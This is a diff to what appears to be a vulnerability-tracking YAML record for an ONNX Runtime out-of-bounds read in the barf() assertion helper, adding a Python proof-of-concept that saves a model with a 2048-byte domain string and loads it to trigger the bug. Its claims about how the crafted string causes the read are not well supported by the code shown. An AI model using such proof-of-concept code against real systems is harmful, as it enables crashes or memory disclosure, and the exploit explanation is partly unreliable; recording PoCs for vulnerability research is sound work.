@@ -30,6 +30,25 @@ fix_commit: ""
 github_advisory: ""
 poc_available: true
 poc_link: "https://hiddenlayer.com/sai-security-advisory/2024-02-onnx/"
+poc_code: |
+  # Trigger OOB read in ONNX Runtime assertion helper (barf() / ONNX_ASSERTM).
+  # A crafted ONNX model with an attribute string >= 2048 bytes and no null terminator
+  # causes barf() to read past the end of the message buffer.
+  import onnx
+  from onnx import TensorProto, helper
+
+  # Build model with an intentionally long (>=2048 byte) domain/op attribute string
+  # that lacks proper null termination in the serialized protobuf form.
+  long_attr = "A" * 2048  # exceeds barf()'s internal buffer → OOB read
+  node = helper.make_node("Identity", ["x"], ["y"], domain=long_attr)
+  graph = helper.make_graph([node], "poc",
+      [helper.make_tensor_value_info("x", TensorProto.FLOAT, [1])],
+      [helper.make_tensor_value_info("y", TensorProto.FLOAT, [1])])
+  model = helper.make_model(graph)
+  onnx.save(model, "/tmp/ort_oob_poc.onnx")
+
+  import onnxruntime as rt
+  sess = rt.InferenceSession("/tmp/ort_oob_poc.onnx")  # OOB read triggered here
 poc_notes: >
   HiddenLayer SAI Security Advisory 2024-02-onnx covers this OOB read in the
   barf() assertion helper when a string message >= 2048 bytes with no null
